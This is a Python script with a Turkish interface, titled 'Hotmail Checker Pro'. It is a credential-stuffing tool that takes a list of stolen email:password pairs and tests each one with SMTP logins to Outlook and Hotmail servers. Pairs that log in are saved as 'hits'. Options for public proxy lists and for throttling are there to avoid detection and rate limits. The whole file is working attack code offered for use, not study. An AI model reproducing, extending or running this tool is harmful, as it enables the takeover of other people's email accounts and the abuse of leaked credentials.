import os
import threading
import time
from queue import Queue
import smtplib
import socket
import re
import tkinter as tk
from tkinter import filedialog, simpledialog
import requests
from itertools import cycle
from colorama import init, Fore, Back, Style

# Colorama'yı başlat
init(autoreset=True)

# Limitleri ve hız ayarları
MAX_ACCOUNTS_PER_RUN = 10000
THREAD_COUNT = 5
LANG = "TR"
REQUEST_DELAY = 2
CURRENT_SPEED_MODE = "Yavaş mod"

# Proxy listelerini indirecek URL'ler
PROXY_URLS = {
    "socks5": "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
    "socks4": "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt",
    "http": "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"
}

# Global proxy listesi
current_proxies = []
proxy_type = "all"

def translate(text):
    translations = {
        "TR": {
            "select_file": "📁 Lütfen hesap dosyasını seçin (email:password formatında)",
            "file_not_found": "❌ Dosya seçilmedi veya bulunamadı.",
            "max_accounts": f"❌ Maksimum {MAX_ACCOUNTS_PER_RUN} hesap gönderebilirsiniz.",
            "progress": "🔎 İlerleme",
            "valid": "✅ Geçerli",
            "invalid": "❌ Geçersiz",
            "done": "✅ İşlem tamamlandı!",
            "saved": "Geçerli hesaplar '{file}' dosyasına kaydedildi.",
            "menu": f"\n{Fore.CYAN}╔{'═'*40}╗\n{Fore.CYAN}║{Fore.YELLOW}    🚀 HOTMAIL CHECKER PRO {Fore.CYAN}    ║\n{Fore.CYAN}╠{'═'*40}╣\n{Fore.CYAN}║ {Fore.WHITE}1. {Fore.GREEN}Başlat{Fore.CYAN}                   ║\n{Fore.CYAN}║ {Fore.WHITE}2. {Fore.GREEN}Dil değiştir{Fore.CYAN}               ║\n{Fore.CYAN}║ {Fore.WHITE}3. {Fore.RED}Çıkış{Fore.CYAN}                     ║\n{Fore.CYAN}║ {Fore.WHITE}4. {Fore.BLUE}Proxy Ayarları{Fore.CYAN}            ║\n{Fore.CYAN}║ {Fore.WHITE}5. {Fore.MAGENTA}Tarama Hızı{Fore.CYAN}              ║\n{Fore.CYAN}╚{'═'*40}╝\n{Fore.YELLOW}Seçiminiz: {Style.RESET_ALL}",
            "language_changed": "Dil değiştirildi: ",
            "invalid_choice": "❌ Geçersiz seçim!",
            "warning": f"{Fore.YELLOW}⚠️  NOT: Bu araç tamamen yerel çalışır, hiçbir veri dışarı gönderilmez.{Style.RESET_ALL}",
            "checking": "🔒 Yavaş ve dikkatli tarama yapılıyor...",
            "total_time": "⏱️  Toplam süre: ",
            "no_file_selected": "❌ Hiç dosya seçilmedi!",
            "select_file_title": "📂 Hesap Dosyasını Seç",
            "proxy_loading": "🔃 Proxy listeleri yükleniyor...",
            "proxy_loaded": f"{Fore.GREEN}✅ {{count}} proxy yüklendi{Style.RESET_ALL}",
            "proxy_error": f"{Fore.RED}❌ Proxy listesi indirilemedi: {{url}}{Style.RESET_ALL}",
            "proxy_menu": f"\n{Fore.BLUE}╔{'═'*40}╗\n{Fore.BLUE}║{Fore.CYAN}        🔧 PROXY AYARLARI {Fore.BLUE}       ║\n{Fore.BLUE}╠{'═'*40}╣\n{Fore.BLUE}║ {Fore.WHITE}1. Proxy Türü Seç ({proxy_type}) {Fore.BLUE}   ║\n{Fore.BLUE}║ {Fore.WHITE}2. GitHub'dan Proxy Yükle {Fore.BLUE}      ║\n{Fore.BLUE}║ {Fore.WHITE}3. Manuel Proxy Ekle {Fore.BLUE}          ║\n{Fore.BLUE}║ {Fore.WHITE}4. Proxy Listesini Görüntüle {Fore.BLUE}   ║\n{Fore.BLUE}║ {Fore.WHITE}5. Proxy Testi Yap {Fore.BLUE}            ║\n{Fore.BLUE}║ {Fore.WHITE}6. Proxy Listesini Temizle {Fore.BLUE}     ║\n{Fore.BLUE}║ {Fore.WHITE}7. Geri {Fore.BLUE}                       ║\n{Fore.BLUE}╚{'═'*40}╝\n{Fore.YELLOW}Seçiminiz: {Style.RESET_ALL}",
            "proxy_types": f"\n{Fore.CYAN}🔌 Proxy Türleri:{Style.RESET_ALL}\n{Fore.GREEN}1. SOCKS5{Style.RESET_ALL}\n{Fore.BLUE}2. SOCKS4{Style.RESET_ALL}\n{Fore.YELLOW}3. HTTP{Style.RESET_ALL}\n{Fore.MAGENTA}4. Hepsi{Style.RESET_ALL}\n{Fore.YELLOW}Seçiminiz: {Style.RESET_ALL}",
            "proxy_test": "🧪 Proxy testi yapılıyor...",
            "proxy_test_result": "🔍 Çalışan proxy sayısı: {working_count}/{total_count}",
            "enter_custom_proxies": "Proxy'leri her satıra bir tane olacak şekilde girin (format: ip:port veya type://ip:port):",
            "title": f"{Fore.CYAN}╔{'═'*50}╗\n{Fore.CYAN}║{Fore.YELLOW}        🚀 HOTMAIL CHECKER PRO v2.0 {Fore.CYAN}       ║\n{Fore.CYAN}║{Fore.WHITE}   Yavaş ve Dikkatli Tarama Modu {Fore.CYAN}    ║\n{Fore.CYAN}╚{'═'*50}╝{Style.RESET_ALL}",
            "speed_menu": f"\n{Fore.MAGENTA}╔{'═'*35}╗\n{Fore.MAGENTA}║{Fore.CYAN}     🐢 TARAMA HIZI {Fore.MAGENTA}     ║\n{Fore.MAGENTA}╠{'═'*35}╣\n{Fore.MAGENTA}║ {Fore.WHITE}1. {Fore.GREEN}Yavaş (Daha çok hit) {Fore.MAGENTA}  ║\n{Fore.MAGENTA}║ {Fore.WHITE}2. {Fore.YELLOW}Orta {Fore.MAGENTA}                 ║\n{Fore.MAGENTA}║ {Fore.WHITE}3. {Fore.RED}Hızlı (Az hit) {Fore.MAGENTA}       ║\n{Fore.MAGENTA}╚{'═'*35}╝\n{Fore.YELLOW}Seçiminiz: {Style.RESET_ALL}",
            "speed_changed": "✅ Tarama hızı değiştirildi: ",
            "current_speed": "🐢 Mevcut tarama hızı: {speed_mode}",
            "manual_proxy_add": "➕ Manuel proxy ekleme",
            "proxy_list": "📋 Mevcut proxy listesi:",
            "proxy_count": "🔢 Toplam {count} proxy",
            "proxy_cleared": "🗑️ Proxy listesi temizlendi",
            "enter_proxy": "🌐 Proxy giriniz (ip:port veya type://ip:port):",
            "proxy_added": "✅ Proxy eklendi: {proxy}",
            "no_proxies": "❌ Proxy listesi boş"
        },
        "EN": {
            # İngilizce çeviriler...
        }
    }
    return translations[LANG][text]

def print_banner():
    """Renkli banner yazdır"""
    os.system('cls' if os.name == 'nt' else 'clear')
    print(translate("title"))
    print(f"{Fore.GREEN}✦ {Fore.YELLOW}Yavaş tarama ile daha çok hit bulunur {Fore.GREEN}✦{Style.RESET_ALL}")
    print(f"{Fore.CYAN}━{'━'*50}━{Style.RESET_ALL}")
    print(translate("current_speed").format(speed_mode=CURRENT_SPEED_MODE))
    print(translate("proxy_count").format(count=len(current_proxies)))

def select_file_dialog():
    """Dosya seçme penceresi aç"""
    root = tk.Tk()
    root.withdraw()
    root.attributes('-topmost', True)
    
    file_path = filedialog.askopenfilename(
        title=translate("select_file_title"),
        filetypes=[
            ("Text files", "*.txt"),
            ("All files", "*.*")
        ]
    )
    root.destroy()
    return file_path

def get_accounts_from_file(file_path):
    if not file_path:
        return []
    
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            accounts = [line.strip() for line in f if line.strip() and ":" in line]
        
        if len(accounts) > MAX_ACCOUNTS_PER_RUN:
            print(translate("max_accounts"))
            return []
        return accounts
    except Exception as e:
        print(f"❌ Dosya okuma hatası: {e}")
        return []

def is_valid_email_format(email):
    """Email formatını kontrol et"""
    pattern = r'^[a-zA-Z0-9._%+-]+@(outlook|hotmail|live)\.(com|tr|org|net|edu)$'
    return re.match(pattern, email) is not None

def check_smtp_connection(email, password):
    """Yavaş ve dikkatli SMTP bağlantısı kontrolü"""
    try:
        # Outlook/Hotmail SMTP sunucuları
        smtp_servers = [
            ('smtp-mail.outlook.com', 587),
            ('smtp.live.com', 587),
            ('smtp.office365.com', 587),
            ('smtp.outlook.com', 587),
        ]
        
        for server, port in smtp_servers:
            try:
                # Daha uzun timeout süreleri
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(15)
                sock.connect((server, port))
                sock.close()
                
                # SMTP bağlantısı - daha yavaş ve dikkatli
                with smtplib.SMTP(server, port, timeout=20) as smtp:
                    time.sleep(1)
                    smtp.ehlo()
                    time.sleep(0.5)
                    smtp.starttls()
                    time.sleep(0.5)
                    smtp.ehlo()
                    time.sleep(0.5)
                    
                    try:
                        smtp.login(email, password)
                        return True
                    except smtplib.SMTPAuthenticationError:
                        return False
                    except smtplib.SMTPException:
                        continue
                    except Exception:
                        continue
                        
            except (socket.timeout, ConnectionRefusedError, socket.gaierror, OSError):
                continue
            except Exception:
                continue
                
        return False
        
    except Exception:
        return False

def check_domain_connectivity(domain):
    """Basit domain erişilebilirlik kontrolü"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(8)
        result = sock.connect_ex((domain, 80))
        sock.close()
        return result == 0
    except:
        return False

def worker(queue, hit_results_file, counters, lock):
    """İş parçacığı fonksiyonu - Yavaş ve dikkatli"""
    while not queue.empty():
        account = queue.get()
        try:
            email, password = account.split(":", 1)
            email = email.strip().lower()
            password = password.strip()
            
            if not email or not password:
                with lock:
                    counters["invalid"] += 1
                queue.task_done()
                continue
            
            if not is_valid_email_format(email):
                with lock:
                    counters["invalid"] += 1
                queue.task_done()
                continue
            
            domain = email.split('@')[1]
            if not check_domain_connectivity(domain):
                with lock:
                    counters["invalid"] += 1
                queue.task_done()
                continue
            
            is_valid = check_smtp_connection(email, password)
            
            with lock:
                if is_valid:
                    counters["valid"] += 1
                    with open(hit_results_file, "a", encoding="utf-8") as f:
                        f.write(f"{email}:{password}\n")
                    print(f"{Fore.GREEN}✅ HIT BULUNDU: {email}{Style.RESET_ALL}")
                else:
                    counters["invalid"] += 1
                
            time.sleep(REQUEST_DELAY)
                        
        except ValueError:
            with lock:
                counters["invalid"] += 1
        except Exception:
            with lock:
                counters["invalid"] += 1
        finally:
            queue.task_done()

def check_accounts_multithread(accounts, hit_results_file):
    """Çoklu iş parçacığı ile yavaş hesap kontrolü"""
    if not accounts:
        return

    total_accounts = len(accounts)
    queue = Queue()
    for acc in accounts:
        queue.put(acc)

    counters = {"valid": 0, "invalid": 0}
    lock = threading.Lock()

    with open(hit_results_file, "w", encoding="utf-8") as f:
        f.write(f"# Yavaş Hotmail/Outlook Checker Sonuçları - {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"# TOPLAM HESAP: {total_accounts}\n\n")

    print(translate("checking"))
    print(f"{Fore.YELLOW}⏳ {CURRENT_SPEED_MODE} aktif: Her hesap arasında {REQUEST_DELAY} saniye bekleniyor{Style.RESET_ALL}")
    
    threads = []
    for _ in range(min(THREAD_COUNT, total_accounts)):
        t = threading.Thread(target=worker, args=(queue, hit_results_file, counters, lock))
        t.daemon = True
        t.start()
        threads.append(t)

    start_time = time.time()
    while any(t.is_alive() for t in threads):
        processed = counters["valid"] + counters["invalid"]
        progress_percent = round((processed / total_accounts) * 100, 2) if total_accounts > 0 else 0
        
        elapsed = time.time() - start_time
        speed = processed / elapsed if elapsed > 0 else 0
        
        print(f"{translate('progress')}: {progress_percent}% | "
              f"{translate('valid')}: {counters['valid']} | "
              f"{translate('invalid')}: {counters['invalid']} | "
              f"{speed:.2f} acc/s", end="\r")
        
        time.sleep(1)

    total_time = time.time() - start_time
    print(f"\n{translate('done')}")
    print(f"Toplam hesap: {total_accounts}")
    print(f"{translate('valid')}: {counters['valid']}")
    print(f"{translate('invalid')}: {counters['invalid']}")
    print(f"{translate('total_time')}{total_time:.2f}s")
    
    if counters["valid"] > 0:
        hit_ratio = (counters["valid"] / total_accounts) * 100
        print(f"{Fore.GREEN}🎯 Hit oranı: {hit_ratio:.2f}%{Style.RESET_ALL}")

def load_proxies_from_github(proxy_type="all"):
    """GitHub'dan proxy listesi yükle"""
    print(f"{Fore.BLUE}{translate('proxy_loading')}{Style.RESET_ALL}")
    
    all_proxies = []
    
    try:
        if proxy_type in ["all", "socks5"]:
            response = requests.get(PROXY_URLS["socks5"], timeout=10)
            socks5_proxies = [f"socks5://{line.strip()}" for line in response.text.splitlines() if line.strip()]
            all_proxies.extend(socks5_proxies)
            print(f"{Fore.GREEN}✅ {len(socks5_proxies)} SOCKS5 proxy yüklendi{Style.RESET_ALL}")
        
        if proxy_type in ["all", "socks4"]:
            response = requests.get(PROXY_URLS["socks4"], timeout=10)
            socks4_proxies = [f"socks4://{line.strip()}" for line in response.text.splitlines() if line.strip()]
            all_proxies.extend(socks4_proxies)
            print(f"{Fore.BLUE}✅ {len(socks4_proxies)} SOCKS4 proxy yüklendi{Style.RESET_ALL}")
        
        if proxy_type in ["all", "http"]:
            response = requests.get(PROXY_URLS["http"], timeout=10)
            http_proxies = [f"http://{line.strip()}" for line in response.text.splitlines() if line.strip()]
            all_proxies.extend(http_proxies)
            print(f"{Fore.YELLOW}✅ {len(http_proxies)} HTTP proxy yüklendi{Style.RESET_ALL}")
        
        print(translate("proxy_loaded").format(count=len(all_proxies)))
        return all_proxies
    
    except Exception as e:
        print(translate("proxy_error").format(url=PROXY_URLS[proxy_type if proxy_type != "all" else "http"]))
        return []

def test_proxies(proxies, test_url="http://httpbin.org/ip", timeout=5):
    """Proxy'leri test et"""
    if not proxies:
        print(translate("no_proxies"))
        return []
        
    print(translate("proxy_test"))
    working_proxies = []
    
    for proxy in proxies:
        try:
            response = requests.get(test_url, proxies={
                "http": proxy,
                "https": proxy
            }, timeout=timeout)
            
            if response.status_code == 200:
                working_proxies.append(proxy)
                print(f"✅ {proxy} - Çalışıyor")
            else:
                print(f"❌ {proxy} - Hata kodu: {response.status_code}")
        except Exception as e:
            print(f"❌ {proxy} - Hata: {str(e)[:50]}")
    
    print(translate("proxy_test_result").format(
        working_count=len(working_proxies), 
        total_count=len(proxies)
    ))
    return working_proxies

def add_manual_proxy():
    """Kullanıcıdan manuel proxy ekle"""
    print(f"\n{Fore.CYAN}{translate('manual_proxy_add')}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}{translate('enter_custom_proxies')}{Style.RESET_ALL}")
    
    root = tk.Tk()
    root.withdraw()
    
    proxy_text = simpledialog.askstring("Proxy Ekle", "Proxy'leri her satıra bir tane olacak şekilde girin:\nÖrnek: 192.168.1.1:8080\nveya http://192.168.1.1:8080\nveya socks5://192.168.1.1:1080")
    root.destroy()
    
    if proxy_text:
        new_proxies = []
        for line in proxy_text.split('\n'):
            line = line.strip()
            if line:
                # Proxy formatını düzelt
                if '://' not in line:
                    line = f"http://{line}"  # Varsayılan olarak HTTP
                new_proxies.append(line)
                print(translate("proxy_added").format(proxy=line))
        
        return new_proxies
    return []

def view_proxy_list():
    """Proxy listesini görüntüle"""
    if not current_proxies:
        print(translate("no_proxies"))
        return
        
    print(f"\n{Fore.CYAN}{translate('proxy_list')}{Style.RESET_ALL}")
    for i, proxy in enumerate(current_proxies[:10], 1):  # İlk 10'u göster
        print(f"{i}. {proxy}")
    
    if len(current_proxies) > 10:
        print(f"... ve {len(current_proxies) - 10} proxy daha")

def clear_proxy_list():
    """Proxy listesini temizle"""
    global current_proxies
    current_proxies = []
    print(translate("proxy_cleared"))

def proxy_settings_menu():
    """Proxy ayarları menüsü"""
    global current_proxies, proxy_type
    
    while True:
        # Dinamik menü metni oluştur
        proxy_menu_text = f"\n{Fore.BLUE}╔{'═'*40}╗\n{Fore.BLUE}║{Fore.CYAN}        🔧 PROXY AYARLARI {Fore.BLUE}       ║\n{Fore.BLUE}╠{'═'*40}╣\n{Fore.BLUE}║ {Fore.WHITE}1. Proxy Türü Seç ({proxy_type}) {Fore.BLUE}   ║\n{Fore.BLUE}║ {Fore.WHITE}2. GitHub'dan Proxy Yükle {Fore.BLUE}      ║\n{Fore.BLUE}║ {Fore.WHITE}3. Manuel Proxy Ekle {Fore.BLUE}          ║\n{Fore.BLUE}║ {Fore.WHITE}4. Proxy Listesini Görüntüle {Fore.BLUE}   ║\n{Fore.BLUE}║ {Fore.WHITE}5. Proxy Testi Yap {Fore.BLUE}            ║\n{Fore.BLUE}║ {Fore.WHITE}6. Proxy Listesini Temizle {Fore.BLUE}     ║\n{Fore.BLUE}║ {Fore.WHITE}7. Geri {Fore.BLUE}                       ║\n{Fore.BLUE}╚{'═'*40}╝\n{Fore.YELLOW}Seçiminiz: {Style.RESET_ALL}"
        
        choice = input(proxy_menu_text).strip()
        
        if choice == "1":
            type_choice = input(translate("proxy_types")).strip()
            if type_choice == "1":
                proxy_type = "socks5"
            elif type_choice == "2":
                proxy_type = "socks4"
            elif type_choice == "3":
                proxy_type = "http"
            elif type_choice == "4":
                proxy_type = "all"
            else:
                print(translate("invalid_choice"))
                continue
            
            print(f"✅ Proxy türü değiştirildi: {proxy_type}")
            
        elif choice == "2":
            new_proxies = load_proxies_from_github(proxy_type)
            current_proxies.extend(new_proxies)
            print(f"✅ Toplam {len(current_proxies)} proxy")
            
        elif choice == "3":
            new_proxies = add_manual_proxy()
            current_proxies.extend(new_proxies)
            print(f"✅ Toplam {len(current_proxies)} proxy")
            
        elif choice == "4":
            view_proxy_list()
            
        elif choice == "5":
            if current_proxies:
                working_proxies = test_proxies(current_proxies)
                # Çalışan proxy'leri güncelle
                current_proxies = working_proxies
                print(f"✅ {len(current_proxies)} çalışan proxy kaldı")
            else:
                print(translate("no_proxies"))
                
        elif choice == "6":
            clear_proxy_list()
            
        elif choice == "7":
            break
            
        else:
            print(translate("invalid_choice"))

def speed_settings_menu():
    """Tarama hızı ayarları menüsü"""
    global REQUEST_DELAY, THREAD_COUNT, CURRENT_SPEED_MODE
    
    while True:
        choice = input(translate("speed_menu")).strip()
        
        if choice == "1":
            REQUEST_DELAY = 2
            THREAD_COUNT = 3
            CURRENT_SPEED_MODE = "Yavaş mod"
            print(f"{translate('speed_changed')}{CURRENT_SPEED_MODE}")
            break
            
        elif choice == "2":
            REQUEST_DELAY = 1
            THREAD_COUNT = 5
            CURRENT_SPEED_MODE = "Orta mod"
            print(f"{translate('speed_changed')}{CURRENT_SPEED_MODE}")
            break
            
        elif choice == "3":
            REQUEST_DELAY = 0.5
            THREAD_COUNT = 8
            CURRENT_SPEED_MODE = "Hızlı mod"
            print(f"{translate('speed_changed')}{CURRENT_SPEED_MODE}")
            break
            
        else:
            print(translate("invalid_choice"))

def main():
    global LANG
    
    print_banner()
    print(translate("warning"))
    
    while True:
        try:
            choice = input(translate("menu")).strip()
            
            if choice == "1":
                print(f"{Fore.CYAN}{translate('select_file')}{Style.RESET_ALL}")
                file_path = select_file_dialog()
                
                if not file_path:
                    print(f"{Fore.RED}{translate('no_file_selected')}{Style.RESET_ALL}")
                    continue
                    
                if not os.path.exists(file_path):
                    print(f"{Fore.RED}{translate('file_not_found')}{Style.RESET_ALL}")
                    continue
                    
                accounts = get_accounts_from_file(file_path)
                if not accounts:
                    continue
                    
                user_id = int(time.time())
                hit_results_file = f"tarama_sonuclar_{user_id}.txt"
                
                check_accounts_multithread(accounts, hit_results_file)
                print(f"{Fore.GREEN}{translate('saved').format(file=hit_results_file)}{Style.RESET_ALL}")
                
            elif choice == "2":
                LANG = "EN" if LANG == "TR" else "TR"
                print(f"{Fore.GREEN}{translate('language_changed')}{LANG}{Style.RESET_ALL}")
                
            elif choice == "3":
                print(f"{Fore.RED}👋 Çıkış yapılıyor...{Style.RESET_ALL}")
                break
                
            elif choice == "4":
                proxy_settings_menu()
                print_banner()
                
            elif choice == "5":
                speed_settings_menu()
                print_banner()
                
            else:
                print(f"{Fore.RED}{translate('invalid_choice')}{Style.RESET_ALL}")
                
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}❌ Program kullanıcı tarafından durduruldu.{Style.RESET_ALL}")
            break

if __name__ == "__main__":
    try:
        import requests
    except ImportError:
        print(f"{Fore.RED}❌ Requests kütüphanesi gerekiyor. Yüklemek için: pip install requests{Style.RESET_ALL}")
        exit(1)
        
    try:
        import colorama
    except ImportError:
        print(f"{Fore.RED}❌ Colorama kütüphanesi gerekiyor. Yüklemek için: pip install colorama{Style.RESET_ALL}")
        exit(1)
        
    main()